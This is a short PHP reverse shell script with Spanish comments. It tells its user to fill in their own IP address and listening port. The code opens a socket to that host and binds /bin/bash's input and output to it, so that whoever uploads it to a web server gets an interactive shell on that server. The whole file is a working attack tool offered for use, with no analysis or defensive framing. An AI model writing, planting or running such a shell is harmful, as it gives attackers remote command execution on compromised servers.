<?php
set_time_limit (0);
$ip = '192.168.1.21';  // Aquí va tu IP
$port = 433;   // Aquí va el puerto que vas a escuchar
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/bash', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>

